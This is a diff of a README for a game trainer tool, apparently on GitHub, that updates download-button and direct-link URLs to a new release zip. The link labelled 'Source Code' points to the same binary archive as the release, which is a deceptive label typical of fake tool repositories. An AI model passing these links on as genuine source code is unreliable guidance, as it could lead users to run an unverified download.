@@ -38,7 +38,7 @@
 <tr>
 <td align="center">
 
-<a href="https://github.com/TriangleShahCompact/Aniimo-Master-Trainer/releases/download/1/Aniimo-Master-Trainer.zip">
+<a href="https://github.com/TriangleShahCompact/Aniimo-Master-Trainer/releases/download/2/Aniimo-Master-Trainer.v1.0.zip">
   <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
 </a>
 
@@ -51,8 +51,8 @@
 </table>
 
 **Direct Links:**
-- [Latest Release](https://github.com/TriangleShahCompact/Aniimo-Master-Trainer/releases/download/1/Aniimo-Master-Trainer.zip)
-- [Source Code](https://github.com/TriangleShahCompact/Aniimo-Master-Trainer/releases/download/1/Aniimo-Master-Trainer.zip)
+- [Latest Release](https://github.com/TriangleShahCompact/Aniimo-Master-Trainer/releases/download/2/Aniimo-Master-Trainer.v1.0.zip)
+- [Source Code](https://github.com/TriangleShahCompact/Aniimo-Master-Trainer/releases/download/2/Aniimo-Master-Trainer.v1.0.zip)
 
 ---
 
@@ -321,3 +321,4 @@ This project is licensed under the **MIT License** — see the [LICENSE](LICENSE
     <img src="https://img.shields.io/badge/Made%20with%20🐉%20for%20the%20Aniimo%20Community-9B59B6?style=for-the-badge" alt="Made with love">
   </a>
 </p>
+
